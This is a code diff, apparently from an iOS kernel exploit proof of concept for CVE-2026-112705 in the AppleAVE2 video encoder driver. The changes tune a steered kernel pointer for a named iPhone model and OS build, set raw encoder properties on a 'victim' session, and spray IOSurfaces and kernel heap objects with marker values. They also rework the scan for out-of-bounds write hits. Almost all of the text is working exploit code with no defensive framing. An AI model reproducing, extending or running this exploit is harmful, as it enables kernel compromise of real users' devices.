@@ -75,7 +75,9 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
             : [NSString stringWithFormat:@"ave112705.sprite%d.ntl%d.armed", count, ntl];
         _title = (ntl == 16433)
             ? [NSString stringWithFormat:@"AVE2 sprite x%d", count]
-            : [NSString stringWithFormat:@"AVE2 sprite x%d (NTL=%d)", count, ntl];
+            : (ntl == 0
+                ? [NSString stringWithFormat:@"AVE2 sprite x%d (auto/16444)", count]
+                : [NSString stringWithFormat:@"AVE2 sprite x%d (NTL=%d)", count, ntl]);
         _subtitle = [NSString stringWithFormat:
                      @"CVE-2026-112705: raw EncoderUsage=1 + NTL=%d after spray (no 60/15 clamp)", ntl];
         _icon = @"square.grid.3x3.middle.filled";
@@ -109,9 +111,10 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
 
 - (CVPixelBufferRef)makeBufferWidth:(int)w height:(int)h {
     CVPixelBufferRef pb = NULL;
+    NSDictionary *attrs = @{ (id)kCVPixelBufferIOSurfacePropertiesKey: @{} };
     CVPixelBufferCreate(kCFAllocatorDefault, w, h,
                         kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
-                        NULL, &pb);
+                        (__bridge CFDictionaryRef)attrs, &pb);
     if (pb) {
         CVPixelBufferLockBaseAddress(pb, 0);
         memset(CVPixelBufferGetBaseAddressOfPlane(pb, 0), 0x40,
@@ -195,7 +198,7 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         int32_t hiSigned = (int32_t)(uint32_t)(liveKPtrs[0] >> 32);
         ntl = 16463 + hiSigned;
     } else if (ntl <= 0) {
-        ntl = 16433; // 0xffffffe200000059 (.DATA zone)
+        ntl = 16444; // 0xffffffed00000059 (AppleAVE2 outer-object band on iPhone16,1 27.0.1)
     }
     uint64_t steeredX0 = ((uint64_t)(uint32_t)(ntl - 16463) << 32) | 0x59ULL;
 
@@ -250,6 +253,7 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
     }
     OSStatus pmSt = 0;
     OSStatus uSt = VTSessionSetProperty(victim, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
+    OSStatus rtSt = VTSessionSetProperty(victim, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
     OSStatus privNSt = 0;
     if (ntl >= 16463) {
         pmSt = VTSessionSetProperty(victim, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
@@ -268,10 +272,10 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         CFNumberGetValue(vbn, kCFNumberIntType, &vrbPost);
         CFRelease(vbn);
     }
-    [self journal:[NSString stringWithFormat:@"VICTIM_CREATED session=%p ntl=%d pm=%d usage=%d privSet=%d set=%d pre=%d prep=%d post=%d",
-                   (void *)victim, ntl, (int)pmSt, (int)uSt, (int)privNSt, (int)nSt, vrbPre, (int)vPrep, vrbPost]];
-    [report appendFormat:@"victim session created (%p) before spray: pm=%d usage=%d privSet=%d NTL_set(%d)=%d PRE=%d prep=%d POST=%d\n",
-     (void *)victim, (int)pmSt, (int)uSt, (int)privNSt, ntl, (int)nSt, vrbPre, (int)vPrep, vrbPost];
+    [self journal:[NSString stringWithFormat:@"VICTIM_CREATED session=%p ntl=%d pm=%d usage=%d rt=%d privSet=%d set=%d pre=%d prep=%d post=%d",
+                   (void *)victim, ntl, (int)pmSt, (int)uSt, (int)rtSt, (int)privNSt, (int)nSt, vrbPre, (int)vPrep, vrbPost]];
+    [report appendFormat:@"victim session created (%p) before spray: pm=%d usage=%d rt=%d privSet=%d NTL_set(%d)=%d PRE=%d prep=%d POST=%d\n",
+     (void *)victim, (int)pmSt, (int)uSt, (int)rtSt, (int)privNSt, ntl, (int)nSt, vrbPre, (int)vPrep, vrbPost];
 
     // 2) SPRAY siblings — arm with PropertyMode=1, EnableUserRefForFacetime=YES,
     //    UserDPBFramesForFaceTime (34 int32s including OOB pair #16 carrying x0cands),
@@ -343,25 +347,37 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
     SpriteISUnlockFn sIsUnlock = isLib ? (SpriteISUnlockFn)dlsym(isLib, "IOSurfaceUnlock") : NULL;
     SpriteISGetBaseFn sIsGetBase = isLib ? (SpriteISGetBaseFn)dlsym(isLib, "IOSurfaceGetBaseAddress") : NULL;
     SpriteISGetSizeFn sIsGetSize = isLib ? (SpriteISGetSizeFn)dlsym(isLib, "IOSurfaceGetAllocSize") : NULL;
+    uint64_t markerPair = ((uint64_t)(uint32_t)self.marker << 32) | (uint32_t)self.marker;
     CFMutableArrayRef surfArray = NULL;
     if (sIsCreate && sIsLock && sIsUnlock && sIsGetBase && sIsGetSize) {
         surfArray = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
-        for (int s = 0; s < 96; s++) {
+        for (int s = 0; s < 64; s++) {
             NSDictionary *props = @{
                 @"IOSurfaceWidth": @1024, @"IOSurfaceHeight": @2048,
                 @"IOSurfaceBytesPerElement": @4, @"IOSurfacePixelFormat": @0x42475241,
             };
             void *surf = sIsCreate((__bridge CFDictionaryRef)props);
-            if (surf) { CFArrayAppendValue(surfArray, surf); CFRelease(surf); }
+            if (surf) {
+                uint32_t seed = 0;
+                if (sIsLock(surf, 0, &seed) == 0) {
+                    uint8_t *base = (uint8_t *)sIsGetBase(surf);
+                    size_t sz = sIsGetSize(surf);
+                    if (base && sz >= 0x4000) {
+                        for (size_t pg = 0; pg + 128 <= sz; pg += 0x4000) {
+                            uint64_t *pw = (uint64_t *)(base + pg);
+                            for (int wi = 0; wi < 16; wi++) pw[wi] = markerPair;
+                        }
+                    }
+                    sIsUnlock(surf, 0, &seed);
+                }
+                CFArrayAppendValue(surfArray, surf);
+                CFRelease(surf);
+            }
         }
     }
     [report appendFormat:@"fixed-page spray: %ld surfaces\n",
      surfArray ? (long)CFArrayGetCount(surfArray) : 0L];
 
-    // === Kernel-object spray (strategy doc): objects whose METADATA lives in
-    // kheap — OOL data copies (ipc kalloc), pipe buffers. Content is tiled with
-    // the marker pair so a landed stp write ([x0, x0, x0, 0]) stands out.
-    uint64_t markerPair = ((uint64_t)(uint32_t)self.marker << 32) | (uint32_t)self.marker;
     uint8_t *tile = (uint8_t *)malloc(256 * 1024);
     if (tile) {
         uint64_t *tq = (uint64_t *)tile;
@@ -460,25 +476,28 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
             if (sIsLock(surf, 0, &seed) != 0) continue;
             uint8_t *base = (uint8_t *)sIsGetBase(surf);
             size_t sz = sIsGetSize(surf);
-            if (base && sz >= 32) {
+            if (base && sz >= 0x4000) {
                 for (size_t off = 0; off + 32 <= sz; off += 8) {
+                    size_t pageBase = off & ~(size_t)0x3fffULL;
+                    size_t pageOff = off & 0x3fffULL;
+                    uint64_t expected = (pageOff < 128) ? markerPair : 0ULL;
                     uint64_t q = *(uint64_t *)(base + off);
-                    if (q == 0) continue;
-                    int match = -1;
+                    if (q == expected) continue;
+                    int match = (pageOff < 128) ? 200 : 201;
+                    uint64_t u59 = 0;
+                    if (pageBase + 0x59 + sizeof(uint64_t) <= sz) {
+                        memcpy(&u59, base + pageBase + 0x59, sizeof(uint64_t));
+                    }
                     for (int c = 0; c < ncand; c++) {
-                        if (q == x0cands[c]) { match = c; break; }
+                        if (q == x0cands[c] || u59 == x0cands[c]) { match = c; break; }
                     }
-                    if (match < 0 && (uint32_t)q == 0x59u) match = 59;
-                    uint64_t mPair = ((uint64_t)(uint32_t)marker << 32) | (uint32_t)marker;
-                    if (match < 0 && q == mPair) match = 100 + (int)(q & 0xff);
-                    if (match >= 0) {
-                        uint64_t q2 = *(uint64_t *)(base + off + 8);
-                        uint32_t z = *(uint32_t *)(base + off + 0x18);
-                        [report appendFormat:@"    SURFACE HIT surf=%ld off=0x%zx q=0x%llx q2=0x%llx z=0x%x match=%d\n",
-                         (long)si, off, q, q2, z, match];
-                        hits++;
-                        if (hits >= 8) break;
-                    }
+                    if (match >= 200 && ((uint32_t)q == 0x59u || (uint32_t)u59 == 0x59u)) match = 59;
+                    uint64_t q2 = *(uint64_t *)(base + off + 8);
+                    uint32_t z = *(uint32_t *)(base + off + 0x18);
+                    [report appendFormat:@"    SURFACE HIT surf=%ld off=0x%zx q=0x%llx q2=0x%llx u59=0x%llx z=0x%x match=%d\n",
+                     (long)si, off, q, q2, u59, z, match];
+                    hits++;
+                    if (hits >= 8) break;
                 }
             }
             sIsUnlock(surf, 0, &seed);
